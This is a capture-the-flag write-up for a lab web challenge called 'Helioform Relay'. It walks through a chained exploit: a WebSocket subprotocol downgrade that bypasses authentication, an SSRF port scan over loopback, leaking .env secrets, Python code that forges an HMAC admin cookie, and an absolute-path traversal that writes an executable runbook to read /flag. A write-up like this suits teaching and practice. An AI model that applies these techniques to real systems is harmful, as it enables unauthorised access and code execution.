# Helioform Relay

I had the web port and nothing else. No binary, no source, no client. The challenge description says the flag is at `/flag` inside the container. I pointed my browser at `http://127.0.0.1:18080/` and started reading.

The landing page is plain. It calls itself "Helioform Relay 4.2," says it sits at the edge of a generation site, and has two links: `/docs/hsp` (protocol notes) and `/console/login` (a sign-in form). No input fields, no JavaScript, no hidden endpoints.

![Site overview](screenshots/01-overview.png)

---

## The login form is a decoy

`admin`/`admin`, empty fields, SQL in both fields — every attempt returns the same "Invalid credentials." No rate limit, no lockout, no username/password distinction, no timing difference. Not a brute-force challenge.

![Failed operator login](screenshots/04-login-fail.png)

The login page links to `/docs/session`, which describes how the admin session actually works.

![Session notes, with no key](screenshots/03-session.png)

```text
cookie      hsp_session
value       payload_b64.mac_hex
payload     base64url(JSON), padding removed
json        iss, aud, role, exp
role        admin
mac         HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64) as lowercase hex
            the key is the literal environment string, not hex-decoded
iss, aud    must match the factory environment on this appliance
```

So admin access is not a password — it is a signed cookie. **The page itself specifies every field:** the value is `payload_b64.mac_hex`, the JSON needs `iss`/`aud`/`role`/`exp`, `role` must be `admin`, and the MAC is `HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64)`. I don't have to reverse anything here — the format is handed to me. What I'm missing is three *values*: `CONSOLE_MAC_KEY`, and the required `iss`/`aud`. The page says the key is not in the document. I saved the format and moved on to find those values.

---

## The protocol framing comes straight from /docs/hsp

I did not reverse-engineer the HSP header. `/docs/hsp` prints it:

```text
offset  size  field
0       4     magic    HSP1       (four ASCII bytes: 0x48 0x53 0x50 0x31)
4       2     opcode              (little-endian u16)
6       2     flags               (little-endian u16, bit 0 set on a reply)
8       4     body length         (little-endian u32)
12      n     body
```

![Mesh protocol notes](screenshots/02-protocol.png)

That is the entire framing: a 12-byte header (`HSP1` magic, LE opcode, LE flags, LE length) then the body. Success replies echo the opcode with flags `0x0001`; errors use opcode `0x007F`. Everything I send for the rest of the challenge is built from this one table.

The same page prints the **customer opcode table** — again, I'm reading it, not discovering it:

| opcode | name      | body                    |
|--------|-----------|-------------------------|
| 0x01   | HELLO     | optional client name    |
| 0x02   | PING      | empty                   |
| 0x03   | SUBSCRIBE | ignored; one telemetry line |

And a paragraph about a second subprotocol: agents that "cannot mask WebSocket frames" request `hsp.raw.1`; after the 101 the socket is a raw HSP stream; the edge "authenticates an agent before it can open a channel." That phrase — *open a channel* — is the only hint that the agent transport has a capability the customer one does not. I didn't know what that capability was yet. I found out by asking the agent transport to describe itself.

---

## The customer transport describes itself

I connected with `Sec-WebSocket-Protocol: hsp.ws.1` and sent the documented HELLO. **The HELLO banner is the server listing its own commands** — this is the mechanism I rely on from here on:

```text
>> opcode=0x0001 HELLO  "field-laptop"
<< opcode=0x0001 flags=0x0001
   hsp-edge/4.2 transport=websocket auth=session
   commands=HELLO:0x01,PING:0x02,SUBSCRIBE:0x03
```

The banner says `commands=HELLO:0x01,PING:0x02,SUBSCRIBE:0x03`. Exactly the three documented opcodes, nothing more. `auth=session`. This transport is a telemetry viewer and it tells me so.

---

## The agent transport lists DIAL and its body format

Same URL, same upgrade, one header changed: `Sec-WebSocket-Protocol: hsp.raw.1`. The server returns 101 and echoes `hsp.raw.1`. After that I stop using WebSocket framing and send raw HSP bytes on the socket. Then HELLO — and **this banner lists a command the customer one didn't, and prints its body format:**

```text
>> opcode=0x0001 HELLO  "agent"
<< opcode=0x0001 flags=0x0001 len=134
   hsp-edge/4.2 transport=raw auth=legacy-proxy
   commands=HELLO:0x01,PING:0x02,DIAL:0x10
   dial=host:port
   dial-ack=splices
   egress=127.0.0.1
```

Line by line, this is the server teaching me the DIAL command:
- `commands=...,DIAL:0x10` → DIAL is **opcode 0x10**. I did not guess this number; the banner states it.
- `dial=host:port` → the DIAL **body is the literal string `host:port`**.
- `dial-ack=splices` → on success the socket is spliced to the target.
- `egress=127.0.0.1` → only loopback is reachable.

Raw hex of the banner, confirming it's plain ASCII with no framing of its own:

```text
0000  68 73 70 2d 65 64 67 65 2f 34 2e 32 20 74 72 61   hsp-edge/4.2 tra
0040  2c 50 49 4e 47 3a 30 78 30 32 2c 44 49 41 4c 3a   ,PING:0x02,DIAL:
0050  30 78 31 30 0a 64 69 61 6c 3d 68 6f 73 74 3a 70   0x10.dial=host:p
0060  6f 72 74 0a 64 69 61 6c 2d 61 63 6b 3d 73 70 6c   ort.dial-ack=spl
0070  69 63 65 73 0a 65 67 72 65 73 73 3d 31 32 37 2e   ices.egress=127.
0080  30 2e 30 2e 31 0a                                 0.0.1.
```

The customer banner said `auth=session`; this one says `auth=legacy-proxy`. The difference is the whole bug: the raw transport accepts the completed WebSocket upgrade as proof that a proxy already authenticated me. Nothing asked me for a credential. Requesting `hsp.raw.1` is the authentication bypass.

Going back to the customer transport with the opcode I now *know* (0x10) confirms it's privilege-gated there, not missing:

```text
# on hsp.ws.1:
>> opcode=0x0010  127.0.0.1:80   << err: scope edge.dial required
```

Same opcode, refused on the customer transport, granted on the agent transport.

---

## DIAL is an SSRF oracle — the error strings tell me which ports are live

The banner gave me the body format (`host:port`) and the egress rule (`127.0.0.1`). Now I read the **error strings** to map the internal network. The server returns a different message for each failure reason:

```text
>> opcode=0x0010  8.8.8.8:53       << err: egress denied                   (host != 127.0.0.1)
>> opcode=0x0010  localhost:7710   << err: egress denied                   (string compare: "localhost" != "127.0.0.1")
>> opcode=0x0010  127.0.0.1:80     << err: dial failed                     (connect attempted, refused -> nothing listening)
>> opcode=0x0010  not-a-target     << err: dial target required (host:port)
```

`egress denied` vs `dial failed` is the oracle: `dial failed` means the connect was actually attempted and refused, so the port is closed but reachable; a port that is *open* returns `ok splice` instead. I scanned `127.0.0.1` across 7600–7740 plus common ports and watched for `ok splice`:

```text
open ports (ok splice): 8080, 7710, 7711, 7712, 7713
```

8080 is the web server I'm already on. The other four are internal. I didn't know what they were — so I dialed the lowest one and sent HELLO, because by now I know HELLO makes a service describe itself.

---

## catalogd (7710) prints the entire internal API

After `ok splice` on 7710, a HELLO comes back as a **full service catalog** — every remaining opcode and body format I need is in this one response:

```text
>> DIAL 127.0.0.1:7710   << ok splice
>> HELLO
<< opcode=0x0001 flags=0x0001 len=260
   nonce=9f92df840fe847ddedd4c64febe52a3b
   ticket_opcode=0x20
   ticket_body=nonce
   export_opcode=0x30
   export_fields=ticket,path
   status_opcode=0x40
   status_fields=ticket
   body=key=value lines
   services:
   127.0.0.1:7710 catalogd
   127.0.0.1:7711 provd
   127.0.0.1:7712 recordd
```

This is the server handing me the rest of the protocol:
- `ticket_opcode=0x20`, `ticket_body=nonce` → to get a ticket, send **opcode 0x20** with the **nonce as the raw body**.
- `export_opcode=0x30`, `export_fields=ticket,path` → provd's export is **opcode 0x30**, body has **`ticket` and `path`** fields.
- `status_opcode=0x40`, `status_fields=ticket` → recordd's status is **opcode 0x40**, body has a **`ticket`** field.
- `body=key=value lines` → those fields are sent as `key=value` lines in the body.
- The service directory names 7710/7711/7712. (7713 is deliberately *not* here — I find it later from recordd.)

So I send the nonce back exactly as described — raw body, opcode 0x20:

```text
>> opcode=0x0020
   9f92df840fe847ddedd4c64febe52a3b
<< opcode=0x0020
   ticket=tkt.9f92df840fe847ddedd4c64febe52a3b.5928fdca6c64c7c6cc8dea0983224a0a
   ttl=600
```

A ten-minute ticket, used for provd and recordd below.

---

## provd (7711): opcode and fields from the catalog, filename from the errors

From the catalog I already know provd is opcode 0x30 with fields `ticket` and `path`, sent as `key=value` lines. The only thing the catalog does *not* give me is which file to ask for. I let the **error messages** narrow it down. First, the obvious target:

```text
>> opcode=0x0030
   ticket=tkt.9f92df840fe847ddedd4c64febe52a3b.5928fdca6c64c7c6cc8dea0983224a0a
   path=/flag
<< err: dotenv loader refuses non-env path
```

The error names the constraint: it only loads `.env` paths. I probe the directory boundary and the two distinct errors tell me exactly where the allowed root is:

```text
path=/etc/passwd                << err: dotenv loader refuses non-env path   (wrong extension)
path=/.env                      << err: path outside provision root          (extension ok, wrong dir)
path=/opt/helioform/relay.env   << err: path outside provision root          (wrong dir)
path=/etc/helioform/.env        << err: no such env file                     (dir ok! file missing)
```

`/etc/helioform/` flips the error from "outside provision root" to "no such env file" — the directory is accepted and now it's doing a lookup. This is the **one inferential step** in the solve: the file's *name*. The product is "Helioform Relay" on every page, so I try `relay.env` — and the error turning into actual file contents confirms the guess was right:

```text
>> path=/etc/helioform/relay.env
<< opcode=0x0030 flags=0x0001 len=397
   CONSOLE_MAC_KEY=7f3c9a2e1b84d056a0c3e91f44b7d2aa
   CONSOLE_ISS=helioform-factory
   CONSOLE_AUD=relay-console
   REPLICATION_MAC_KEY=c1d4e8f02a6b9375d0e1f4a8b2c65d90
   MESH_CAPTURE_ENABLED=1
```

These are the three values the session page told me I was missing (`CONSOLE_MAC_KEY`, `CONSOLE_ISS`, `CONSOLE_AUD`), plus `REPLICATION_MAC_KEY`, which I'll need later. The second file name, `collector.env`, I get the same way — same directory, and the server's own `relay.env` comment pointed at a collector identity:

```text
>> path=/etc/helioform/collector.env
<< COLLECTOR_PEER=relay-collector
   COLLECTOR_INTERVAL_SEC=5
   LOG_ROOT=/var/log/helioform/streams
   SITE_ID=north
```

`nope.env` returns `no such env file`, so this is a named lookup, not a directory listing — I only get files I can name.

---

## recordd (7712): opcode from the catalog, and it names port 7713

Catalog said status is opcode 0x40, field `ticket`. I send exactly that:

```text
>> opcode=0x0040
   ticket=tkt....
<< opcode=0x0040
   epoch=7
   tip=47a237fede22de258c6ae30e9ffe7fdca76d7c8b1f16a8325f84100699c59640
   bind=d70e37a4a0ea69726232246e6bde2c8c
   repl_port=7713
   write=peer-only
```

**This response is where 7713 comes from** (`repl_port=7713`) — I didn't scan-guess its purpose, recordd names it. It also hands me `epoch`, `tip`, `bind`, and tells me writes are `peer-only`. Dialing 7713 and sending a plain HELLO confirms it wants a specific handshake I don't know yet:

```text
>> DIAL 127.0.0.1:7713   << ok splice
>> opcode=0x0001 HELLO   << err: peer handshake required
>> opcode=0x0017         << err: peer hello required
```

Opcode 0x17 is recognized (error changes to "peer hello required") but gated behind a peer hello whose format isn't in any catalog. I stopped here deliberately — the replication wire format is documented somewhere else: the console. To reach the console I need the cookie, and I finally have the values for it.

---

## Forging the admin cookie — every field was specified by /docs/session

Nothing new to discover; I'm filling in the format the session page already printed, with the values provd leaked:

```python
import base64, hashlib, hmac, json, time
claims = {"iss": "helioform-factory", "aud": "relay-console",
          "role": "admin", "exp": int(time.time()) + 3600}
payload_b64 = base64.urlsafe_b64encode(
    json.dumps(claims, separators=(",", ":")).encode()).decode().rstrip("=")
mac = hmac.new(b"7f3c9a2e1b84d056a0c3e91f44b7d2aa",   # literal ASCII, not hex-decoded
               payload_b64.encode(), hashlib.sha256).hexdigest()
cookie = payload_b64 + "." + mac
```

`iss`/`aud` are the exact strings from `relay.env`; `role=admin` and the unpadded-base64url + lowercase-hex MAC are exactly what the page specified. A zeroed MAC gives 401; the real MAC is accepted.

![Mesh operator, after the forged cookie](screenshots/05-console.png)

---

## The console trace prints the replication grammar — this is where the 0x11/0x17 bodies come from

The console has two pages. **Runbooks** (`/console/automation`) tells me the code-exec sink:

![Runbooks, before anything has run](screenshots/06-runbooks-idle.png)

```text
Directory   /var/lib/helioform/runbooks
Header      HSP-RUNBOOK
Interval    5s, and whenever a new file is written
```

Any file in that directory starting with the line `HSP-RUNBOOK` is executed. I can't write there from the console (no upload), and it's a different directory from the collector's `LOG_ROOT`. I need the replication write primitive — and the second console page documents it.

**Peer trace** (`/console/trace`): POST to arm a 45-second capture. Its top section is a **decoder legend** — the server printing the exact replication wire format and MAC strings. *This* is the source for everything in the next two steps; I am not inventing these layouts:

![Peer trace with one live collector exchange](screenshots/07-peer-trace.png)

```text
integers on the wire are little-endian; tip is 32 raw bytes; bind is 16 raw bytes; mac is 32 raw bytes

peer hello body: u16 peer_len | peer | u32 epoch | tip[32] | mac[32]
hello mac_canonical = hsp-repl/1|hello|{epoch}|{tip_hex}|{peer}

commit blob body: u16 stream_len | stream_id | u8 mode | u32 epoch | tip[32] | bind[16] | u32 body_len | body | mac[32]
mode 0x01 replaces the resolved stream file with body
blob mac_canonical = hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{stream_id}|{body_sha256}
body_sha256 = lowercase hex SHA-256 of the raw body
```

Read literally:
- **Peer hello (0x11) body** = `u16 peer_len` + `peer` + `u32 epoch` + `tip[32]` + `mac[32]`. The MAC signs `hsp-repl/1|hello|{epoch}|{tip_hex}|{peer}`.
- **Commit blob (0x17) body** = `u16 stream_len` + `stream_id` + `u8 mode` + `u32 epoch` + `tip[32]` + `bind[16]` + `u32 body_len` + `body` + `mac[32]`. The MAC signs `hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{stream_id}|{body_sha256}`.

The page's live section shows one real collector exchange that matches the legend byte-for-byte: `peer=relay-collector` (= `COLLECTOR_PEER`), `resolved=/var/log/helioform/streams/<stream_id>` (= `LOG_ROOT` + stream_id), and the same `epoch`/`tip`/`bind` I read from recordd. That confirms the signing key is `REPLICATION_MAC_KEY` from `relay.env`.

One behavioral detail the trace makes me learn: the values in it are already stale. The built-in collector commits every 5 seconds and each commit advances the tip, so a MAC signed over the trace's tip is rejected:

```text
>> opcode=0x0011  signed over trace/old tip   << err: stale tip
```

So the recipe is: read recordd status for a *fresh* `epoch`/`tip`/`bind`, compute the MACs, and send both frames to 7713 before the next collector tick (~5s window).

---

## Building the two frames from the legend

Straight translation of the decoder into bytes — peer name is `relay-collector` (from `collector.env`), key is `REPLICATION_MAC_KEY`:

```python
# peer hello (0x11): u16 peer_len | peer | u32 epoch | tip[32] | mac[32]
canonical = f"hsp-repl/1|hello|{epoch}|{tip}|{peer}"
mac = hmac.new(repl_key.encode(), canonical.encode(), hashlib.sha256).hexdigest()
hello = struct.pack("<H", len(peer)) + peer.encode() \
      + struct.pack("<I", epoch) + bytes.fromhex(tip) + bytes.fromhex(mac)
```

The commit blob is the same mechanical process; the only open question is the `stream_id`, because that's what decides which file gets written.

---

## Path traversal: the one thing the legend doesn't restrict

The trace showed the collector's `stream_id` (`site-north-inverter-14.log`) resolving under `LOG_ROOT`. I want to escape to the runbook directory. Relative traversal is checked:

```text
>> 0x0017  stream_id=../runbooks/intake.py   << err: stream id rejected   (".." blocked)
```

But the resolver only blocks `..`; it joins `stream_id` onto `LOG_ROOT`, and on POSIX joining an **absolute** path discards the prefix. The legend never said the id has to be relative — so I give an absolute one:

```text
>> opcode=0x0017
   stream_id=/var/lib/helioform/runbooks/intake.py
   mode=0x01
   body=
   HSP-RUNBOOK
   import pathlib
   print(pathlib.Path('/flag').read_text())
<< opcode=0x0017 flags=0x0001
   ok path=/var/lib/helioform/runbooks/intake.py
```

Hex of the blob head confirms the layout from the legend: `25 00` is the LE length (37) of the stream_id, and the `01` right after the path is the mode byte:

```text
0000  25 00 2f 76 61 72 2f 6c 69 62 2f 68 65 6c 69 6f   %./var/lib/helio
0010  66 6f 72 6d 2f 72 75 6e 62 6f 6f 6b 73 2f 69 6e   form/runbooks/in
0020  74 61 6b 65 2e 70 79 01 ...                       take.py.
```

The write lands in the runbook directory, the file begins with `HSP-RUNBOOK`, and the scheduler runs it on the next tick. Refresh `/console/automation`:

![Runbook output](screenshots/08-flag.png)

```text
CSCTF{hsp_raw_d0wngrade_pr0xy_dial_env_t4p_runb00k}
```

---

## Where every parameter came from

| Thing I used | How I knew it (not guessed) |
|---|---|
| HSP 12-byte header, LE fields, `HSP1` magic | printed at `/docs/hsp` |
| Customer opcodes 0x01/0x02/0x03 | opcode table at `/docs/hsp` |
| `hsp.raw.1` exists and bypasses auth | `/docs/hsp` paragraph + raw HELLO banner `auth=legacy-proxy` |
| DIAL = 0x10, body = `host:port`, egress = 127.0.0.1 | raw HELLO banner lines `commands=...DIAL:0x10`, `dial=host:port`, `egress=127.0.0.1` |
| Which internal ports are open | DIAL `ok splice` vs `dial failed` oracle |
| Ticket 0x20, export 0x30, status 0x40 + their fields | catalogd HELLO (`ticket_opcode`, `export_fields`, `status_fields`, `body=key=value`) |
| provd only serves `.env` under `/etc/helioform/` | provd error strings (`refuses non-env path`, `outside provision root`, `no such env file`) |
| filename `relay.env` | **inferred** from product name; confirmed by the file contents returning |
| repl port 7713, epoch/tip/bind | recordd status response (`repl_port=7713`) |
| cookie = `payload_b64.mac_hex`, fields, HMAC key usage | `/docs/session` |
| cookie values (key, iss, aud) | leaked from `relay.env` via provd |
| runbook dir + `HSP-RUNBOOK` exec | `/console/automation` |
| peer-hello 0x11 / commit-blob 0x17 body layouts + MAC canonicals | `/console/trace` decoder legend |
| tips go stale every 5s | trace note + observed `err: stale tip` |
| absolute `stream_id` escapes LOG_ROOT | legend omits the restriction; `..` blocked but leading `/` isn't |

Every step is read from the server, except the single `relay.env` filename, which is an educated guess the server then confirms. No frame layout in this writeup was reverse-engineered or brute-forced.
